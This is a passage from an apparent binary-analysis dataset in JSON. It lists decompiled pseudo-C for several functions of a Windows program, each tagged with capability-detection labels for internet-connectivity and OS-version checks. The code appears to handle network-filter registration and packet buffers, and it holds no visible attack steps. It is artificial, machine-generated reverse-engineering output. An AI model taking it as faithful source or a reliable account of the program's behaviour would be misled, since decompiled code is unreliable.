var_120h = 0x61;\n    var_11eh = 0x6f;\n    var_11ch = 0x74;\n    var_11ah = 0;\n    var_118h = 0;\n    var_116h = 0;\n    stack0xffffff90 = 0;\n    fcn.00078bfa(&var_68h, 0, 0x2c);\n    var_154h = &var_f1h + 1;\n    do {\n        iVar1 = *var_154h;\n        var_154h = var_154h + 1;\n    } while (iVar1 != 0);\n    var_164h = &var_f1h + 1;\n    do {\n        iVar1 = *var_164h;\n        var_164h = var_164h + 1;\n    } while (iVar1 != 0);\n    fcn.000384c0(&var_f1h + 1, &var_f1h + (var_164h - (&var_f1h + 3) >> 1) * 2 + 1, \n                 &var_f1h + (var_154h - (&var_f1h + 3) >> 1) * 2 + 3);\n    var_174h = &var_3ch;\n    do {\n        iVar1 = *var_174h;\n        var_174h = var_174h + 2;\n    } while (iVar1 != 0);\n    var_184h = &var_3ch;\n    do {\n        iVar1 = *var_184h;\n        var_184h = var_184h + 2;\n    } while (iVar1 != 0);\n    fcn.000384c0(&var_3ch, &var_3ch + (var_184h - (&var_3ch + 2) >> 1) * 2, \n                 &var_3ch + (var_174h - (&var_3ch + 2) >> 1) * 2 + 2);\n    var_194h = &var_150h;\n    do {\n        iVar1 = *var_194h;\n        var_194h = var_194h + 2;\n    } while (iVar1 != 0);\n    var_1a4h = &var_150h;\n    do {\n        iVar1 = *var_1a4h;\n        var_1a4h = var_1a4h + 2;\n    } while (iVar1 != 0);\n    fcn.000384c0(&var_150h, &var_150h + (var_1a4h - (&var_150h + 2) >> 1) * 2, \n                 &var_150h + (var_194h - (&var_150h + 2) >> 1) * 2 + 2);\n    var_1b4h = &var_90h;\n    do {\n        iVar1 = *var_1b4h;\n        var_1b4h = var_1b4h + 2;\n    } while (iVar1 != 0);\n    var_1c4h = &var_90h;\n    do {\n        iVar1 = *var_1c4h;\n        var_1c4h = var_1c4h + 2;\n    } while (iVar1 != 0);\n    fcn.000384c0(&var_90h, &var_90h + (var_1c4h - (&var_90h + 2) >> 1) * 2, \n                 &var_90h + (var_1b4h - (&var_90h + 2) >> 1) * 2 + 2);\n    var_1d4h = &var_b0h;\n    do {\n        iVar1 = *var_1d4h;\n        var_1d4h = var_1d4h + 2;\n    } while (iVar1 != 0);\n    var_1e4h = &var_b0h;\n    do {\n        iVar1 = *var_1e4h;\n        var_1e4h = var_1e4h + 2;\n    } while (iVar1 != 0);\n    fcn.000384c0(&var_b0h, &var_b0h + (var_1e4h - (&var_b0h + 2) >> 1) * 2, \n                 &var_b0h + (var_1d4h - (&var_b0h + 2) >> 1) * 2 + 2);\n    var_1f4h = &var_110h;\n    do {\n        iVar1 = *var_1f4h;\n        var_1f4h = var_1f4h + 2;\n    } while (iVar1 != 0);\n    var_204h = &var_110h;\n    do {\n        iVar1 = *var_204h;\n        var_204h = var_204h + 2;\n    } while (iVar1 != 0);\n    fcn.000384c0(&var_110h, &var_110h + (var_204h - (&var_110h + 2) >> 1) * 2, \n                 &var_110h + (var_1f4h - (&var_110h + 2) >> 1) * 2 + 2);\n    var_214h = var_20h;\n    do {\n        iVar1 = *var_214h;\n        var_214h = var_214h + 1;\n    } while (iVar1 != 0);\n    var_224h = var_20h;\n    do {\n        iVar1 = *var_224h;\n        var_224h = var_224h + 1;\n    } while (iVar1 != 0);\n    fcn.000384c0(var_20h, var_20h + (var_224h - (var_20h + 1) >> 1), var_20h + (var_214h - (var_20h + 1) >> 1) + 1);\n    var_234h = &var_d0h;\n    do {\n        iVar1 = *var_234h;\n        var_234h = var_234h + 2;\n    } while (iVar1 != 0);\n    var_244h = &var_d0h;\n    do {\n        iVar1 = *var_244h;\n        var_244h = var_244h + 2;\n    } while (iVar1 != 0);\n    fcn.000384c0(&var_d0h, &var_d0h + (var_244h - (&var_d0h + 2) >> 1) * 2, \n                 &var_d0h + (var_234h - (&var_d0h + 2) >> 1) * 2 + 2);\n    var_254h = &var_134h;\n    do {\n        iVar1 = *var_254h;\n        var_254h = var_254h + 2;\n    } while (iVar1 != 0);\n    var_264h = &var_134h;\n    do {\n        iVar1 = *var_264h;\n        var_264h = var_264h + 2;\n    } while (iVar1 != 0);\n    fcn.000384c0(&var_134h, &var_134h + (var_264h - (&var_134h + 2) >> 1) * 2, \n                 &var_134h + (var_254h - (&var_134h + 2) >> 1) * 2 + 2);\n    var_54h = 1;\n    var_5ch = &var_f1h + 1;\n    if ((*0x800ce8d8 != 0) || (var_114h = (**0x800ce76c)(0, 10, 0, &var_6dh + 1, 0x800ce8d8),  var_114h == 0)) {\n        var_6dh._0_1_ = '\\x01';\n        var_114h = (**0x800ce764)(*0x800ce8d8, 0);\n        if (var_114h == 0) {\n            var_f1h._0_1_ = '\\x01';\n            var_114h = fcn.00045630(0x80051c18, 0x80052558, *0x800ce8d4, 0x80085a20, 0x80086120, 0x800860f0, &var_3ch, \n                                    &var_90h, 0x800ce8e0, 0x800ce8e8);\n            if (((var_114h == 0) &&\n                (var_114h = fcn.00045630(0x80051e18, 0x80052568, *0x800ce8d4, 0x80085ee0, 0x80086120, 0, &var_150h, \n                                         &var_b0h, 0x800ce8f0, 0x800ce8f8),  var_114h == 0)) &&\n               (var_114h = (**0x800ce768)(*0x800ce8d8),  var_114h == 0)) {\n                var_f1h._0_1_ = '\\0';\n            }\n        }\n    }\n    if (var_114h != 0) {\n        if (var_f1h != '\\0') {\n            (**0x800ce760)(*0x800ce8d8);\n        }\n        if (var_6dh != '\\0') {\n            (**0x800ce75c)(*0x800ce8d8);\n            *0x800ce8d8 = 0;\n        }\n    }\n    return var_114h;\n}\n",
        "token_count": 5042
    },
    "00044f30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00044f30(void)\n\n{\n    if (*0x800ce8e0 != 0) {\n        (**0x800ce770)(*0x800ce8e0);\n    }\n    if (*0x800ce8f0 != 0) {\n        (**0x800ce770)(*0x800ce8f0);\n    }\n    if (*0x800ce8d8 != 0) {\n        (**0x800ce75c)(*0x800ce8d8);\n    }\n    *0x800ce8d8 = 0;\n    return;\n}\n",
        "token_count": 129
    },
    "00045080": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00045080(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_94h;\n    int32_t var_90h;\n    int32_t var_8ch;\n    int32_t *var_88h;\n    int32_t *var_84h;\n    uint32_t var_80h;\n    uint var_7ch;\n    int32_t var_78h;\n    int32_t var_74h;\n    int32_t *var_70h;\n    int32_t *var_6ch;\n    uint32_t var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_3ch;\n    uint32_t var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint *var_20h;\n    int32_t var_1ch;\n    char var_15h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t *var_4h;\n    \n    var_20h = NULL;\n    var_10h = 0;\n    var_24h = 0;\n    var_4h = NULL;\n    var_1ch = 0;\n    *0x800cd940 = *0x80051f28;\n    *0x800cd944 = *0x80051f2c;\n    *0x800cd948 = *0x80051f30;\n    *0x800cd94c = *0x80051f34;\n    fcn.00078bfa(&var_64h, 0, 0x30);\n    var_60h = *arg_ch;\n    var_5ch = arg_ch[1];\n    var_58h = arg_ch[2];\n    var_54h = arg_ch[3];\n    var_3ch = 0xffffffff;\n    var_50h = 1;\n    var_ch = (**0x800db858)(arg_8h, &var_64h, &var_10h);\n    if ((((var_ch == 0) && (var_ch = (**0x800db850)(arg_8h, var_10h, 0xffffffff, &var_4h, &var_8h),  var_ch == 0)) &&\n        (var_8h != 0)) && (var_20h = fcn.000356c0(0x10),  var_20h != NULL)) {\n        iVar1 = *var_4h;\n        *var_20h = *(iVar1 + 0x38);\n        var_20h[1] = *(iVar1 + 0x3c);\n        var_20h[2] = *(iVar1 + 0x40);\n        var_20h[3] = *(iVar1 + 0x44);\n        var_28h = 1;\n        for (var_14h = 1; var_14h < var_8h; var_14h = var_14h + 1) {\n            var_15h = '\\0';\n            for (var_34h = 0; var_34h < var_28h; var_34h = var_34h + 1) {\n                var_68h = 0x10;\n                var_6ch = var_4h[var_14h] + 0x38;\n                var_70h = var_20h + var_34h * 4;\n                for (; 3 < var_68h; var_68h = var_68h - 4) {\n                    if (*var_70h != *var_6ch) goto code_r0x0004522c;\n                    var_6ch = var_6ch + 1;\n                    var_70h = var_70h + 1;\n                }\n                if (var_68h == 0) {\ncode_r0x000452ae:\n                    var_78h = 0;\n                }\n                else {\ncode_r0x0004522c:\n                    var_74h = *var_70h - *var_6ch;\n                    if (var_74h == 0) {\n                        if (var_68h == 1) goto code_r0x000452ae;\n                        var_74h = *(var_70h + 1) - *(var_6ch + 1);\n                        if (var_74h == 0) {\n                            if (var_68h == 2) goto code_r0x000452ae;\n                            var_74h = *(var_70h + 2) - *(var_6ch + 2);\n                            if (var_74h == 0) {\n                                if ((var_68h == 3) || (var_74h = *(var_70h + 3) - *(var_6ch + 3),  var_74h == 0))\n                                goto code_r0x000452ae;\n                            }\n                        }\n                    }\n                    var_78h = 1;\n                    if (var_74h < 1) {\n                        var_78h = -1;\n                    }\n                }\n                if (var_78h == 0) {\n                    var_15h = '\\x01';\n                    break;\n                }\n            }\n            if (var_15h == '\\0') {\n                iVar1 = fcn.00057d40(&var_20h, var_28h << 4, (var_28h + 1) * 0x10);\n                if (iVar1 < 0) goto code_r0x000455bf;\n                iVar1 = var_4h[var_14h];\n                puVar2 = var_20h + var_28h * 4;\n                *puVar2 = *(iVar1 + 0x38);\n                puVar2[1] = *(iVar1 + 0x3c);\n                puVar2[2] = *(iVar1 + 0x40);\n                puVar2[3] = *(iVar1 + 0x44);\n                var_28h = var_28h + 1;\n            }\n        }\n        if (var_28h == 1) {\n            iVar1 = *var_4h;\n            *0x800cd940 = *(iVar1 + 0x38);\n            *0x800cd944 = *(iVar1 + 0x3c);\n            *0x800cd948 = *(iVar1 + 0x40);\n            *0x800cd94c = *(iVar1 + 0x44);\n        }\n        else {\n            var_ch = (**0x800db85c)(arg_8h, 0, &var_24h);\n            if ((var_ch == 0) &&\n               (var_ch = (**0x800db860)(arg_8h, var_24h, 0xffffffff, &var_1ch, &var_2ch),  var_ch == 0)) {\n                var_30h._0_2_ = 0;\n                for (var_34h = 0; var_34h < var_28h; var_34h = var_34h + 1) {\n                    for (var_14h = 0; var_14h < var_2ch; var_14h = var_14h + 1) {\n                        var_80h = 0x10;\n                        var_84h = *(var_1ch + var_14h * 4);\n                        var_88h = var_20h + var_34h * 4;\n                        for (; 3 < var_80h; var_80h = var_80h - 4) {\n                            if (*var_88h != *var_84h) goto code_r0x0004545b;\n                            var_84h = var_84h + 1;\n                            var_88h = var_88h + 1;\n                        }\n                        if (var_80h == 0) {\ncode_r0x0004551b:\n                            var_90h = 0;\n                        }\n                        else {\ncode_r0x0004545b:\n                            var_8ch = *var_88h - *var_84h;\n                            if (var_8ch == 0) {\n                                if (var_80h == 1) goto code_r0x0004551b;\n                                var_8ch = *(var_88h + 1) - *(var_84h + 1);\n                                if (var_8ch == 0) {\n                                    if (var_80h == 2) goto code_r0x0004551b;\n                                    var_8ch = *(var_88h + 2) - *(var_84h + 2);\n                                    if (var_8ch == 0) {\n                                        if ((var_80h == 3) || (var_8ch = *(var_88h + 3) - *(var_84h + 3),  var_8ch == 0)\n                                           ) goto code_r0x0004551b;\n                                    }\n                                }\n                            }\n                            var_90h = 1;\n                            if (var_8ch < 1) {\n                                var_90h = -1;\n                            }\n                        }\n                        if (var_90h == 0) break;\n                    }\n                    if (var_2ch <= var_14h) break;\n                    if (var_30h < *(*(var_1ch + var_14h * 4) + 0x28)) {\n                        puVar2 = *(var_1ch + var_14h * 4);\n                        *0x800cd940 = *puVar2;\n                        *0x800cd944 = puVar2[1];\n                        *0x800cd948 = puVar2[2];\n                        *0x800cd94c = puVar2[3];\n                        var_30h._0_2_ = *(*(var_1ch + var_14h * 4) + 0x28);\n                    }\n                }\n            }\n        }\n    }\ncode_r0x000455bf:\n    if (var_4h != NULL) {\n        (**0x800db84c)(&var_4h);\n    }\n    if (var_1ch != 0) {\n        (**0x800db84c)(&var_1ch);\n    }\n    if (var_10h != 0) {\n        (**0x800db854)(arg_8h, var_10h);\n    }\n    if (var_24h != 0) {\n        (**0x800db864)(arg_8h, var_24h);\n    }\n    if (var_20h != NULL) {\n        fcn.000357f0(var_20h);\n    }\n    return 0x800cd940;\n}\n",
        "token_count": 2448
    },
    "00045630": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00045630(uint *arg_8h, uint *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, int32_t *arg_28h, uint32_t *arg_2ch)\n\n{\n    uint *puVar1;\n    uint var_dch;\n    int32_t var_d8h;\n    int32_t var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    int32_t var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b0h;\n    uint var_ach;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint *var_74h;\n    uint var_70h;\n    uint *var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    char var_9h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    var_c0h = 0;\n    fcn.00078bfa(&var_bch, 0, 0x94);\n    var_d8h = 0;\n    var_c4h = 0;\n    var_28h = 0;\n    var_24h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    var_18h = 0;\n    var_14h = 0;\n    var_10h = NULL;\n    var_9h = '\\0';\n    var_d4h = 0;\n    if ((*arg_2ch | arg_2ch[1]) != 0) {\n        var_d4h = (**0x800ce778)(*0x800ce8d8, *arg_2ch, arg_2ch[1], &var_d8h);\n    }\n    if ((var_d4h == 0) && (var_d8h != 0)) {\n        (**0x800db84c)(&var_d8h);\n        return 0;\n    }\n    *arg_2ch = 0;\n    arg_2ch[1] = 0;\n    if (*arg_28h != 0) {\n        var_d4h = (**0x800ce784)(*0x800ce8d8, *arg_28h, &var_c4h);\n        if ((var_d4h != 0) || (var_c4h == 0)) {\n            *arg_28h = 0;\n        }\n        if (var_c4h != 0) {\n            (**0x800db84c)(&var_c4h);\n        }\n    }\n    if (*arg_28h == 0) {\n        var_d4h = fcn.00044f80(arg_10h, arg_ch, arg_28h, arg_14h, arg_18h, arg_1ch);\n        if (var_d4h != 0) goto code_r0x000458fa;\n        var_9h = '\\x01';\n        var_d4h = fcn.00044ff0(*0x800ce8d8, arg_ch, arg_8h, arg_20h, 0x80054764);\n        if (var_d4h != 0) goto code_r0x000458fa;\n    }\n    var_b0h = arg_24h;\n    var_ach = 0x80054764;\n    var_98h = *arg_8h;\n    var_94h = arg_8h[1];\n    var_90h = arg_8h[2];\n    var_8ch = arg_8h[3];\n    puVar1 = fcn.00045080(*0x800ce8d8, arg_8h);\n    var_88h = *puVar1;\n    var_84h = puVar1[1];\n    var_80h = puVar1[2];\n    var_7ch = puVar1[3];\n    var_d0h = 0xffffffff;\n    var_cch = 0xffffffff;\n    var_78h = 4;\n    var_74h = &var_d0h;\n    var_68h = 0x4005;\n    var_64h = *arg_ch;\n    var_60h = arg_ch[1];\n    var_5ch = arg_ch[2];\n    var_58h = arg_ch[3];\n    var_6ch = &var_28h;\n    var_70h = 1;\n    var_28h = *0x80051f88;\n    var_24h = *0x80051f8c;\n    var_20h = *0x80051f90;\n    var_1ch = *0x80051f94;\n    var_18h = 0;\n    var_8h = 0;\n    var_4h = 0;\n    var_14h = 0x100;\n    var_10h = &var_8h;\n    var_d4h = (**0x800ce774)(*0x800ce8d8, &var_c0h, 0, arg_2ch);\ncode_r0x000458fa:\n    if (var_d4h != 0) {\n        if (var_9h != '\\0') {\n            (**0x800ce770)(*arg_28h);\n        }\n        *arg_28h = 0;\n        *arg_2ch = 0;\n        arg_2ch[1] = 0;\n    }\n    return var_d4h;\n}\n",
        "token_count": 1377
    },
    "00045970": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00045970(int32_t arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    *(arg_8h + 0x1c) = arg_8h;\n    *(arg_8h + 0x20) = *(arg_8h + 0x630);\n    if ((((*(arg_8h + 0x630) == 1) || (*(arg_8h + 0x630) == 2)) || (*(arg_8h + 0x630) == 3)) || (*(arg_8h + 0x630) == 4)\n       ) {\n        *(arg_8h + 0x24) = *(arg_8h + 0x634);\n    }\n    else {\n        *(arg_8h + 0x24) = 0;\n    }\n    *(arg_8h + 0x28) = *(arg_8h + 0x61c);\n    *(arg_8h + 0x2c) = *(arg_8h + 0x620);\n    fcn.0004cbc0(arg_8h + 8);\n    return 0;\n}\n",
        "token_count": 265
    },
    "00045a20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00045a20(int32_t arg_8h, int32_t arg_ch, int32_t *arg_10h, uint noname_3, uint32_t arg_18h, uint noname_5, \n            uint *arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    ushort extraout_var;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t **var_8h;\n    int32_t *var_4h;\n    \n    var_14h = 0;\n    var_8h = NULL;\n    if ((arg_10h != NULL) && (iVar1 = *arg_10h,  iVar1 != 0)) {\n        arg_10h[4] = 0;\n        *arg_20h = 0x1002;\n        if ((*(*(arg_8h + 8) + 0x1c) != 0x8b) && ((arg_18h != 0 && (iVar2 = fcn.00046dc0(arg_18h),  iVar2 != 0)))) {\n            fcn.00037640(arg_18h + 0x648, &var_ch, 1);\n            if ((*(arg_18h + 0x62c) == 3) || (*(arg_18h + 0x62c) == 1)) {\n                fcn.00037670(arg_18h + 0x648, &var_ch, 1);\n            }\n            else if (*(arg_18h + 0x62c) == 2) {\n                arg_10h[3] = 0;\n                arg_10h[4] = 0;\n                *arg_20h = 0x1001;\n                var_14h = fcn.000356f0(*(iVar1 + 0x1c));\n                var_4h = fcn.000356f0(0x10);\n                if ((var_14h == 0) || (var_4h == NULL)) {\n                    fcn.000357f0(var_14h);\n                    fcn.000357f0(var_4h);\n                    fcn.00037670(arg_18h + 0x648, &var_ch, 1);\n                }\n                else {\n                    *var_4h = 0;\n                    var_4h[1] = 0;\n                    var_4h[2] = 0;\n                    var_4h[3] = 0;\n                    var_4h[3] = var_14h;\n                    var_4h[2] = *(iVar1 + 0x1c);\n                    (**0x800ce78c)(iVar1, var_14h, *(iVar1 + 0x1c), &var_18h);\n                    if (*(arg_18h + 0x664) == 0) {\n                        *(arg_18h + 0x664) = var_4h;\n                    }\n                    else {\n                        for (var_8h = *(arg_18h + 0x664); *var_8h != NULL; var_8h = *var_8h) {\n                        }\n                        *var_8h = var_4h;\n                    }\n                    fcn.00037670(arg_18h + 0x648, &var_ch, 1);\n                    (**0x800510c4)(arg_18h + 0x654, 0, 0);\n                }\n            }\n            else if (*(*(arg_8h + 8) + 0x2c) == 0) {\n                *(arg_18h + 0x62c) = 1;\n                fcn.00037670(arg_18h + 0x648, &var_ch, 1);\n            }\n            else {\n                var_14h = fcn.000356f0(*(iVar1 + 0x1c));\n                if (var_14h == 0) {\n                    fcn.00037670(arg_18h + 0x648, &var_ch, 1);\n                }\n                else {\n                    (**0x800ce78c)(iVar1, var_14h, *(iVar1 + 0x1c), &var_18h);\n                    if (*(iVar1 + 0x1c) < 0x1000) {\n                        var_28h = *(iVar1 + 0x1c);\n                    }\n                    else {\n                        var_28h = 0x1000;\n                    }\n                    var_10h = fcn.0004c1c0(var_14h, var_28h, *(arg_18h + 0x634) == 0);\n                    *(arg_18h + 0x634) = *(arg_18h + 0x634) + *(iVar1 + 0x1c);\n                    if (var_10h == 0) {\n                        if (0x100 < *(arg_18h + 0x634)) {\n                            *(arg_18h + 0x62c) = 1;\n                        }\n                        fcn.00037670(arg_18h + 0x648, &var_ch, 1);\n                    }\n                    else {\n                        arg_10h[3] = 0;\n                        arg_10h[4] = 0;\n                        *arg_20h = 0x1001;\n                        *(arg_18h + 0x62c) = 2;\n                        *(arg_18h + 0x630) = var_10h;\n                        *(arg_18h + 0x638) = *0x800ce8e0;\n                        *(arg_18h + 0x640) = *(arg_ch + 0x20);\n                        *(arg_18h + 0x644) = *(arg_ch + 0x24);\n                        if (((((*(arg_18h + 0x630) == 5) || (*(arg_18h + 0x630) == 6)) || (*(arg_18h + 0x630) == 7)) ||\n                            ((*(arg_18h + 0x630) == 1 || (*(arg_18h + 0x630) == 2)))) ||\n                           ((*(arg_18h + 0x630) == 3 || ((*(arg_18h + 0x630) == 4 || (*(arg_18h + 0x630) == 0xb)))))) {\n                            var_4h = fcn.000356f0(0x10);\n                            if (var_4h == NULL) {\n                                fcn.000357f0(var_14h);\n                            }\n                            else {\n                                *var_4h = 0;\n                                var_4h[1] = 0;\n                                var_4h[2] = 0;\n                                var_4h[3] = 0;\n                                var_4h[3] = var_14h;\n                                var_4h[2] = *(iVar1 + 0x1c);\n                                *(arg_18h + 0x664) = var_4h;\n                                (**0x800510c4)(arg_18h + 0x654, 0, 0);\n                                fcn.00046130(*(arg_18h + 0x624), arg_18h & 0xffff0000 | *(arg_18h + 0x628), \n                                             *(arg_18h + 0x61c), CONCAT22(extraout_var, *(arg_18h + 0x620)));\n                                *(arg_18h + 0x6a0) = 0x80085970;\n                                *(arg_18h + 0x6a4) = arg_18h;\n                                *(arg_18h + 0x698) = 0;\n                                (**0x80051224)(arg_18h + 0x698, 1);\n                            }\n                        }\n                        else {\n                            fcn.000357f0(var_14h);\n                        }\n                        fcn.00037670(arg_18h + 0x648, &var_ch, 1);\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1846
    },
    "00045ee0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00045ee0(int16_t *arg_8h, int32_t arg_ch, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint *arg_20h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *arg_20h = 0x1002;\n    if (*arg_8h == 0x34) {\n        if (*(*(arg_8h + 4) + 0x2c) == 6) {\n            arg_8h_00 = fcn.00046c70(*(*(arg_8h + 4) + 0x34), \n                                     *(*(arg_8h + 4) + 0x14) & 0xffff0000 | *(*(arg_8h + 4) + 0x3c), \n                                     *(*(arg_8h + 4) + 0x14), *(arg_ch + 0x20) & 0xffff0000 | *(*(arg_8h + 4) + 0x24), \n                                     *(arg_ch + 0x20), *(arg_ch + 0x24), arg_8h & 0xffff0000 | *(*(arg_8h + 4) + 100));\n            if (arg_8h_00 != 0) {\n                fcn.00038170(*(arg_8h_00 + 0x62a) == 1, 7, *(arg_8h_00 + 0x61c), \n                             arg_8h_00 & 0xffff0000 | *(arg_8h_00 + 0x620), *(arg_8h_00 + 0x624), \n                             arg_8h_00 & 0xffff0000 | *(arg_8h_00 + 0x628), 0);\n                iVar2 = (**0x800ce788)(*(arg_ch + 0x20), *(arg_ch + 0x24), 0x14, *0x800ce8e0, arg_8h_00, \n                                       arg_8h_00 >> 0x1f);\n                if (iVar2 != 0) {\n                    fcn.00046e70(arg_8h_00, 1);\n                }\n                if ((**(arg_8h + 4) == 0xc) && (piVar1 = *(*(arg_8h + 4) + 4),  *(piVar1[1] + -1 + *piVar1) == '\\0')) {\n                    var_ch = fcn.00078a14(piVar1[1], 0x5c);\n                    if (var_ch == 0) {\n                        var_ch = piVar1[1];\n                    }\n                    else {\n                        var_ch = var_ch + 2;\n                    }\n                    iVar2 = fcn.000380d0(var_ch);\n                    if ((iVar2 != 0) && (puVar3 = fcn.000356f0(0x10),  puVar3 != NULL)) {\n                        *puVar3 = 0;\n                        puVar3[1] = 0;\n                        puVar3[2] = 0;\n                        puVar3[3] = 0;\n                        puVar3[2] = 0x800860d0;\n                        puVar3[3] = puVar3;\n                        *puVar3 = 0;\n                        (**0x80051224)(puVar3, 1);\n                    }\n                }\n            }\n        }\n        else {\n            *arg_20h = 0x2006;\n        }\n    }\n    else {\n        *arg_20h = 0x2006;\n    }\n    return;\n}\n",
        "token_count": 882
    },
    "000460f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000460f0(uint noname_0, uint noname_1, int32_t arg_10h)\n\n{\n    uint var_4h;\n    \n    if (arg_10h != 0) {\n        fcn.00046e70(arg_10h, 0);\n    }\n    return 0;\n}\n",
        "token_count": 76
    },
    "00046130": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00046130(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    ushort uVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint16_t extraout_var;\n    uint16_t extraout_var_00;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*0x800ce918 != 0) && (puVar2 = fcn.000356f0(0x10),  puVar2 != NULL)) {\n        uVar3 = fcn.00035950(arg_8h);\n        puVar2[1] = uVar3;\n        uVar3 = fcn.00035950(arg_10h);\n        puVar2[2] = uVar3;\n        uVar1 = fcn.00035980(arg_ch & 0xffff | extraout_var << 0x10);\n        *(puVar2 + 3) = uVar1;\n        uVar1 = fcn.00035980(arg_14h & 0xffff | extraout_var_00 << 0x10);\n        *(puVar2 + 0xe) = uVar1;\n        fcn.00037640(0x800ce91c, &var_4h, 1);\n        *puVar2 = *0x800ce928;\n        *0x800ce928 = puVar2;\n        fcn.00037670(0x800ce91c, &var_4h, 1);\n    }\n    return;\n}\n",
        "token_count": 349
    },
    "000461d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000461d0(int32_t arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint *var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    if (*0x800ce918 != 0) {\n        fcn.00037640(0x800ce91c, &var_4h, 1);\n        var_8h = NULL;\n        for (var_ch = *0x800ce928; var_ch != NULL; var_ch = *var_ch) {\n            if ((((var_ch[1] == arg_8h) && (var_ch[2] == arg_10h)) && (*(var_ch + 3) == arg_ch)) &&\n               (*(var_ch + 0xe) == arg_14h)) {\n                if (var_8h == NULL) {\n                    *0x800ce928 = *var_ch;\n                }\n                else {\n                    *var_8h = *var_ch;\n                }\n            }\n            var_8h = var_ch;\n        }\n        fcn.00037670(0x800ce91c, &var_4h, 1);\n        fcn.000357f0(0);\n    }\n    return;\n}\n",
        "token_count": 282
    },
    "000462b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
